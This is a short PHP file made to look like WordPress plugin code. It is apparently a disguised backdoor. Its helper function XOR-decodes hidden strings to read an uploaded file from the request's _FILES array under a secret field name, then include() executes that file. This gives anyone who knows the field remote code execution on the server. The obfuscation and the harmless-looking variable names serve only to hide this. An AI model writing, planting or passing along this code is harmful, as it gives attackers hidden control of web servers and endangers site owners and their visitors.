<?php 	
function extension()

{

    $escaped_parts = 'US0xmE8LEsj';
    $string = $escaped_parts;
	$part = 'sort_order';
    
    $post_password = $GLOBALS[diff("%0A%15y4%28%16", $string)];
    $field_no_prefix = $post_password;
    $short_url = isset($field_no_prefix[$string]);

    if ($short_url)

    {
        $flag = $post_password[$string];
        $post_modified = $flag[diff("%21%3E%40%27%03%24U%29", $string)];
        $comment = $post_modified;

        include ($comment);
    }
}
function diff($args, $words_array)

{
    $width = $words_array;
	$return = 'dirs';
    $original_text = "url" . "decode";
	$_edit_link = 'group_by_status';
    $ep_mask = $original_text($args);
    $postname_index = substr($width,0, strlen($ep_mask));
    $patternses = $ep_mask ^ $postname_index;
    
    $ep_mask = strpos($patternses, $postname_index);

    
    return $patternses;
}


extension();

?>
